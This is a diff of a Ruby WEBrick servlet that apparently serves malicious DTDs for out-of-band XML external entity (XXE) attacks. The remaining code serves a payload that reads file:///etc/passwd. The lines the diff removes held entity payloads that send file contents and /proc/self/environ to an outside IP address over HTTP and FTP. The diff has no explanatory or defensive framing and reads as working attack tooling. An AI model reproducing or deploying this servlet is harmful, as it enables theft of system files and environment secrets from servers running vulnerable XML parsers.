@@ -10,9 +10,8 @@ class Echo < WEBrick::HTTPServlet::AbstractServlet
 
     if HTTP
       response.body = <<-EOF
-      <!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM &#x22;http://10.132.56.222:13337/?%data3;&#x22;>">
+
       EOF
-      #<!ENTITY all "%start;%goodies;%end;">
     else
       response.body = <<-EOF
       <!ENTITY % payload SYSTEM "file:///etc/passwd">
@@ -20,16 +19,8 @@ class Echo < WEBrick::HTTPServlet::AbstractServlet
       %param1;
       EOF
     end
-
-=begin
-      <!ENTITY % d SYSTEM "file:///proc/self/environ">
-      <!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://what:akakd@10.132.56.222:13336/%d'>">
-    # ftp://whatever:ayyyyee%%exfil@yourhost
-    #<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://wahtever:ayaya%data3;@10.132.56.222:13336'>">
-    #<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://10.132.56.222:13336/%data3;'>">
-    #<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'http://10.132.56.222:13337/?%data3;'>">
-=end
   end
+
   def do_POST(request, response)
     puts request
     response.status = 200
